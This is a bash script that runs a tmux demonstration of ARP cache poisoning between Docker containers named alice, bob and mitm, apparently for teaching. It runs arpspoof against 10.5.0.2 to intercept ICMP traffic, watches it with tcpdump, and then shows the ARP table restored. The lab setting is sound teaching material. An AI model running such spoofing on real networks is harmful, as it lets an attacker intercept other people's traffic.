#!/usr/bin/env bash

source common.sh

setup() {
  tmux new-session -ds demo "docker attach ${composePrj}-alice-1"
  tmux split-window -dt 0 "docker attach ${composePrj}-bob-1"
  tmux split-window -dht 0 "docker attach ${composePrj}-mitm-1"
  # if container is reused we need a new process (note: this isnt visiblle in logs)
  tmux split-window -dht 2 "docker exec -it ${composePrj}-mitm-1 bash"
}

demo-steps() {
  alice=0
  bob=2
  poison=1
  watch=3

  pane=$alice
  run "# checking network"
  run "ifconfig eth0 | head -2"
  run "# ping BOB to fill ARP table"
  run "ping 10.5.0.3 -c 1"
  run "# checking ARP table"
  run "##### ARP table #####"
  run "arp -a"
  run "# check BOB's MAC address"

  pane=$bob
  run "ifconfig eth0 | head -2"
  run "# ping ALICE to fill ARP table"
  run "ping 10.5.0.2 -c 1"
  run "# checking ARP table"
  run "##### ARP table #####"
  run "arp -a"

  pane=$watch
  run "# watch tcp packets [MITM] ..."
  run "tcpdump -n icmp"

  pane=$alice
  run "# lets ping BOB again"
  run "# tcpdump panel shows: nothing"
  run "ping 10.5.0.3 -c 1"

  pane=$poison
  run "# lets poison the ARP table ..."
  run "arpspoof -t 10.5.0.2  10.5.0.3"
  sleep 2

  pane=$alice
  run "# lets ping BOB now"
  run "# check the tcpdump for stealed ICMP packages"
  run "ping 10.5.0.3 -c 1"
  run "# check the poisoned ARP table"
  run "##### ARP table #####"
  run "arp -a"
  run "# check BOB's MAC address ends 00:04"

  # stop poisioning by: CTRL-c
  tmux send-keys -t $poison C-c

  pane=$alice
  run "# once the poisioning stopped, ARP table is restored. sleep 3"
  sleep 3
  run "arp -a"

}

main "$@"